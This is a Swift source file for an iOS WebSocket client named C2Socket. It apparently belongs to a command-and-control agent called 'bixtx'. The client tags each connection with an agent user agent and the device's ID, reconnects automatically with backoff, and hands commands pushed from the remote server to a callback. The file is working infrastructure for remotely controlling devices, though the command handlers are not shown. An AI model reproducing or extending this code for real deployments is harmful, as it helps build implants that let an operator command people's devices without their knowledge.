import Foundation

/// WebSocket connection to the bixtx C2 server.
/// Uses URLSession's native WebSocket support (iOS 13+).
/// Auto-reconnects with exponential backoff on disconnect.
public final class C2Socket: NSObject {
    private var ws: URLSessionWebSocketTask?
    private var session: URLSession!
    private var reconnectDelay: TimeInterval = 2
    private let maxReconnectDelay: TimeInterval = 60
    private var isConnected = false

    var onCommand: ((_ type: String, _ payload: [String: Any]) -> Void)?
    var onConnect:    (() -> Void)?
    var onDisconnect: (() -> Void)?

    private var deviceId: String {
        UIDevice.current.identifierForVendor?.uuidString ?? UUID().uuidString
    }

    public override init() {
        super.init()
        session = URLSession(configuration: .default, delegate: nil, delegateQueue: .main)
    }

    // MARK: – Connection

    public func connect() {
        guard let url = URL(string: Config.c2WebSocketURL) else { return }
        var req = URLRequest(url: url)
        req.setValue("bixtx-agent/\(Config.agentVersion)", forHTTPHeaderField: "User-Agent")
        req.setValue(deviceId, forHTTPHeaderField: "X-Device-ID")
        req.setValue(Config.platform, forHTTPHeaderField: "X-Platform")

        ws = session.webSocketTask(with: req)
        ws?.resume()
        isConnected = true
        reconnectDelay = 2
        onConnect?()
        listen()
    }

    public func disconnect() {
        isConnected = false
        ws?.cancel(with: .goingAway, reason: nil)
    }

    // MARK: – Send

    public func send(type: String, payload: [String: Any] = [:]) {
        var msg = payload
        msg["type"] = type
        msg["ts"] = Int(Date().timeIntervalSince1970 * 1000)
        guard let data = try? JSONSerialization.data(withJSONObject: msg),
              let str  = String(data: data, encoding: .utf8) else { return }
        ws?.send(.string(str)) { [weak self] err in
            if let err { self?.handleError(err) }
        }
    }

    // MARK: – Receive loop

    private func listen() {
        ws?.receive { [weak self] result in
            guard let self, self.isConnected else { return }
            switch result {
            case .success(let msg):
                self.handleMessage(msg)
                self.listen()
            case .failure(let err):
                self.handleError(err)
            }
        }
    }

    private func handleMessage(_ msg: URLSessionWebSocketTask.Message) {
        var raw: String?
        switch msg {
        case .string(let s): raw = s
        case .data(let d):   raw = String(data: d, encoding: .utf8)
        @unknown default: break
        }
        guard let raw,
              let data = raw.data(using: .utf8),
              let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
              let type = json["type"] as? String else { return }
        let payload = json.filter { $0.key != "type" }
        onCommand?(type, payload)
    }

    private func handleError(_ error: Error) {
        guard isConnected else { return }
        isConnected = false
        ws = nil
        onDisconnect?()
        DispatchQueue.main.asyncAfter(deadline: .now() + reconnectDelay) { [weak self] in
            guard let self, self.isConnected == false else { return }
            self.reconnectDelay = min(self.reconnectDelay * 2, self.maxReconnectDelay)
            self.connect()
        }
    }
}
